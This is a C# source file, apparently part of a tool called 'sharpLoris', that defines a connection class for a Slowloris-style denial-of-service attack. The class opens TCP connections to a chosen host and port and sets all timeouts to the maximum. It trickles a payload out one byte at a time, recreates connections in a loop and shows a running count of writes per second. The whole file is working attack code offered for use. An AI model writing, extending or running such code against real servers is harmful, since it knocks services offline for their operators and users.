using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Threading;

namespace sharpLoris
{
	public class TCPHcoll
	{
		public static int wroteTotal = 0;
		public static int bgWrite = 0;
		private static int secs = 1;

		private static Timer cC = new Timer(m =>
		{
			secs++;
			var toWrite = ($"Started: {bgWrite}\nWroteTotal:{wroteTotal}\nWritesPerSec: {wroteTotal / secs}");
			Console.Clear();
			Console.Write(toWrite);
		}, null, 1000, 1000);

		public TcpClient Tcpcli { get; set; }
		public NetworkStream Ns { get; set; }
		public Queue<byte> Bqueue { get; set; }
		private byte[] _fill;

		private string _host;
		private int _port;

		public TCPHcoll(string host, int port, byte[] queue)
		{
			_host = host;
			_port = port;
			_fill = queue.ToArray();
			ReCon();
		}

		private void ConCallBack(IAsyncResult result)
		{
			if (Tcpcli.Connected)
			{
				Tcpcli.SendTimeout = int.MaxValue;
				Tcpcli.ReceiveTimeout = int.MaxValue;
				Ns = Tcpcli.GetStream();
				Ns.WriteTimeout = int.MaxValue;
				this.Ns.BeginWrite(new byte[] { this.Bqueue.Dequeue() }, 0, 1, LorisLIB.BeginWriteCallBack, this);
				Interlocked.Increment(ref bgWrite);
			}
			else
			{
			}
		}

		public void ReCon()
		{
			Refill();
			Tcpcli = new TcpClient(AddressFamily.InterNetwork);
			Tcpcli.BeginConnect(_host, _port, ConCallBack, this);
		}

		public void ReCreate()
		{
			new TCPHcoll(_host, _port, _fill);
		}

		public void Refill()
		{
			Bqueue = new Queue<byte>(_fill);
		}

		~TCPHcoll()
		{
			Dispose();
		}

		public void Dispose()
		{
			Tcpcli.Close();
			Bqueue = null;
		}

		public TCPHcoll Copy()
		{
			return new TCPHcoll(_host, _port, _fill);
		}
	}
}